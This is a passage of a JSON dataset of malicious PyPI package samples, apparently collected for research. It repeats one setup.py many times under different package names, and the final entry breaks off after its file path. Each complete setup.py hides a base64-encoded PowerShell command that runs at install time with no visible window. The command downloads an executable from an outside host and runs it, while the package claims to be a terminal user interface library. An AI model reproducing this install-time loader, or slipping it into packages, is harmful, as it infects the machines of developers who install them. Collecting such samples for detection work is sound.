        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-paypalinfopip',\n    packages = ['modlib'],\n    version = '3.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-py-replacestringcandy-v4.69",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-replacestringcandy',\n    packages = ['modlib'],\n    version = '1.19',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-py-urlhttphttp-v7.37",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-urlhttphttp',\n    packages = ['modlib'],\n    version = '4.57',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfcvinfoad-v8.12",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcvinfoad',\n    packages = ['modlib'],\n    version = '6.50',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfencodemaskpong-v9.37",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfencodemaskpong',\n    packages = ['modlib'],\n    version = '2.7',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfgetstudyram-v10.3",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgetstudyram',\n    packages = ['modlib'],\n    version = '6.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfguiurlpush-v4.72",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfguiurlpush',\n    packages = ['modlib'],\n    version = '10.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfhttpmcpush-v6.76",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhttpmcpush',\n    packages = ['modlib'],\n    version = '8.21',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfhydrainfoproof-v6.67",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhydrainfoproof',\n    packages = ['modlib'],\n    version = '5.1',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-esqcvinfogrand-v5.33",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcvinfogrand',\n    packages = ['modlib'],\n    version = '7.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfintstringpong-v8.57",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfintstringpong',\n    packages = ['modlib'],\n    version = '9.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfrandomhackedstudy-v5.83",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfrandomhackedstudy',\n    packages = ['modlib'],\n    version = '4.77',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfstudytoolrandom-v5.12",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstudytoolrandom',\n    packages = ['modlib'],\n    version = '8.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-selfsupergameencode-v1.83",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfsupergameencode',\n    packages = ['modlib'],\n    version = '10.96',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-tpedstrproof-v5.69",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpedstrproof',\n    packages = ['modlib'],\n    version = '5.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-tphydratoolsplit-v7.67",
